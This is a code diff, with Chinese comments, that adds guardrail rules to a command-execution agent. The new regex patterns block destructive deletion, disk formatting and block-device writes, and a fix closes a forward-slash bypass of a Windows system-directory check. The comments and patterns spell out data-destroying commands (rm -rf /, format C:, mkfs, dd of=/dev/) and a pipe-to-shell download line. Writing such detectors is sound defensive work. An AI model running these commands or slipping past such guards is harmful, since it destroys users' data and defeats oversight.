@@ -150,6 +150,45 @@ const GUARD_RULES: GuardRule[] = [
     remediation: '确认目标路径是否为合法用户文件',
   },
 
+  // ── 🔧 2026-10-07 补：毁灭性删除 / 磁盘破坏 ────────────────
+  //
+  // 【为什么补】实测发现：`rm -rf /`、`format C:`、`del /f /s /q C:\` 全都返回
+  //   `severity=SAFE` 放行。而护栏当时能拦住的是 `curl http://x.sh | bash`
+  //   这类**注入型**命令 —— 也就是说：**防住了「别人塞进来的命令」，
+  //   却没防住「模型自己写出来的毁灭性命令」**。
+  //   对桌宠这种会自主执行命令的 Agent，后者才是更现实的威胁面。
+  //
+  // 【为什么是 CRITICAL】这三类操作的共同点是**不可逆**：
+  //   删掉根目录/家目录、格式化盘符、覆写块设备 —— 没有「撤销」这个选项。
+  //   按本文件既有的分级约定，CRITICAL 会被 blockCritical 直接拦截。
+  //
+  // 【刻意不收 `rm -rf ./build`】递归删除子目录是开发日常（清 node_modules、
+  //   清构建产物），把它标成危险会让护栏变成噪音、用户学会无脑点「同意」，
+  //   反而削弱真实告警。所以规则只锚定「根 / 家 / 盘符」这三种目标。
+  {
+    id: 'CMD-004',
+    name: '毁灭性删除 — 根目录 / 家目录 / 盘符',
+    category: ThreatCategory.COMMAND_INJECTION,
+    severity: GuardSeverity.CRITICAL,
+    description: '递归强制删除根目录、家目录或整个盘符，会造成不可逆的数据丢失',
+    tools: ['shell_exec'],
+    params: ['command'],
+    // 覆盖 rm -rf / · rm -rf /* · rm -rf ~ · rm -rf $HOME · rm -rf C: · del /f /s /q C:\
+    pattern: /(?:^|[;&|]\s*|\s)(?:rm|rmdir|del)\s+(?:-[a-zA-Z]+\s+|\/[a-zA-Z]+\s+)*(?:\/|\/\*|~\/?|\$HOME|[A-Za-z]:[\\/]?)(?:\s|$|\*)/i,
+    remediation: '拒绝执行。删除操作必须指定具体路径，且不得指向根目录、家目录或盘符。',
+  },
+  {
+    id: 'CMD-005',
+    name: '磁盘破坏 — 格式化 / 块设备覆写',
+    category: ThreatCategory.COMMAND_INJECTION,
+    severity: GuardSeverity.CRITICAL,
+    description: '格式化磁盘或直接向块设备写入数据',
+    tools: ['shell_exec'],
+    params: ['command'],
+    pattern: /\b(?:format\s+[A-Za-z]:|mkfs(?:\.\w+)?\s|dd\b[^|;&]*\bof=\/dev\/|diskpart)/i,
+    remediation: '拒绝执行。磁盘级操作必须由用户手动完成。',
+  },
+
   // ── PATH_TRAVERSAL ─────────────────────────────────
 
   {
@@ -160,8 +199,23 @@ const GUARD_RULES: GuardRule[] = [
     description: '尝试访问 Windows 系统目录',
     tools: ['file_read', 'file_write', 'file_edit', 'file_list', 'file_search'],
     params: ['file_path', 'path', 'rootDir'],
-    pattern: /C:\\Windows\\System32|C:\\Windows\\SysWOW64/i,
+    // 🔧 2026-10-07 修复：原正则写作 /C:\\Windows\\System32|C:\\Windows\\SysWOW64/i，
+    //   **只认反斜杠**。但 Windows 的 API 与 shell 都同时接受正斜杠，
+    //   于是 `C:/Windows/System32/evil.dll` 这类写法**直接绕过护栏**
+    //   （实测 severity=SAFE 放行）。现在两种分隔符都认，且允许混用。
+    pattern: /C:[\\/]+Windows[\\/]+(?:System32|SysWOW64)/i,
     remediation: '拒绝访问系统关键目录。如需查看非系统文件，请指定更精确的目录。',
+  },
+  {
+    id: 'PATH-003',
+    name: '路径穿越 — 访问 Unix 系统目录',
+    category: ThreatCategory.PATH_TRAVERSAL,
+    severity: GuardSeverity.HIGH,
+    description: '尝试写入 /etc、/boot、/usr/bin 等系统目录',
+    tools: ['file_write', 'file_edit'],
+    params: ['file_path', 'path'],
+    pattern: /^\/(?:etc|boot|bin|sbin|usr\/bin|usr\/sbin|lib\/systemd)\//i,
+    remediation: '系统目录不可写入。请改到用户目录下操作。',
   },
   {
     id: 'PATH-002',
